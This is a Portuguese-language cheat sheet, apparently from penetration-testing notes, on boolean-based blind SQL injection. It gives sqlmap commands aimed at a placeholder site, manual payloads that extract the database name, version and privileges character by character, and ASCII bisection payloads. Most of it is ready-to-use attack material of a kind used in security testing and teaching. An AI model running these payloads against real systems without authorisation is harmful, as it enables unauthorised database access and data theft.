# Boolean-based Blind SQL Injection

## Como Funciona

A aplicação responde diferentemente para condições TRUE e FALSE, permitindo inferir dados bit a bit.

```
TRUE:  http://alvo.com/?id=1 AND 1=1  → Página normal com conteúdo
FALSE: http://alvo.com/?id=1 AND 1=2  → Página vazia, erro, ou diferente
```

## Quando Usar

- Resposta muda visivelmente entre condições TRUE/FALSE
- Sem mensagens de erro visíveis
- WAF bloqueia UNION SELECT
- Como técnica complementar

## Detecção com SQLMap

```bash
sqlmap -u "http://alvo.com/?id=1" \
  --technique=B \
  --level=3 \
  --batch

# Com deteção específica de diferença
sqlmap -u "http://alvo.com/?id=1" \
  --technique=B \
  --string="Produto encontrado" \  # texto presente quando TRUE
  --batch
```

## Flags Importantes

```bash
# Definir string de comparação TRUE
--string="bem-vindo"

# Definir string de comparação FALSE (não-match)
--not-string="página não encontrada"

# Regex para identificar TRUE
--regexp="produto.*disponível"

# Código de status para TRUE
--code=200
```

## Técnica Manual

```sql
-- Verificar tamanho do banco atual
' AND LENGTH(database())=6--

-- Extrair caractere por caractere
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),2,1)='p'--

-- Extrair versão
' AND SUBSTRING(@@version,1,1)='5'--

-- Verificar usuário DBA
' AND (SELECT COUNT(*) FROM information_schema.user_privileges WHERE grantee=CURRENT_USER() AND privilege_type='SUPER')>0--
```

## Extração Binária (Bisection)

```sql
-- Técnica mais rápida: bisecção por ASCII
' AND ASCII(SUBSTRING(database(),1,1))>77--   -- >M?
' AND ASCII(SUBSTRING(database(),1,1))>90--   -- >Z?
' AND ASCII(SUBSTRING(database(),1,1))=97--   -- ='a'?
```

## Otimizações SQLMap

```bash
# Mais threads para acelerar
sqlmap -u "http://alvo.com/?id=1" \
  --technique=B \
  --threads=10 \
  --level=2 \
  --batch

# Especificar diferença esperada
sqlmap -u "http://alvo.com/?id=1" \
  --technique=B \
  --string="produto" \
  --threads=5 \
  --batch
```

## Limitações

- **Lento**: Requer muitas requisições para extrair dados
- **Frágil**: Conteúdo dinâmico pode causar falsos negativos
- **Dependente**: Requer diferença clara entre TRUE e FALSE

## Indicadores de Sucesso

```
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
```
